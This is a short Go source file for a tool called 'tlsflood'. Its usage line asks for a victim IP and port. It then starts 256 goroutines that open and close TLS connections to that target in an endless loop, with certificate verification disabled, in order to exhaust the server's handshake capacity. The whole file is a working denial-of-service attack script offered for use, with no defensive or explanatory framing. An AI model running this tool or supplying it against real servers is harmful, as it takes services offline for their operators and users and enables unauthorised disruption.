package main

import (
	"crypto/tls"
	"log"
	"net"
	"os"
	"sync"
)

func main() {
	log.SetPrefix("")
	log.SetFlags(0)
	if len(os.Args) < 2 {
		log.Fatal("usage: tlsflood <victimIP>:<port>")
	}
	config := &tls.Config{
		InsecureSkipVerify: true,
	}
	dialer := &net.Dialer{}
	var wg sync.WaitGroup
	wg.Add(256)
	for i := 0; i < 256; i++ {
		go func() {
			defer wg.Done()
			for {
				c, err := tls.DialWithDialer(dialer, "tcp", os.Args[1], config)
				if err != nil {
					continue
				}
				c.Close()
			}
		}()

	}
	wg.Wait()
}

func check(err error) {
	if err != nil {
		log.Fatal(err)
	}
}
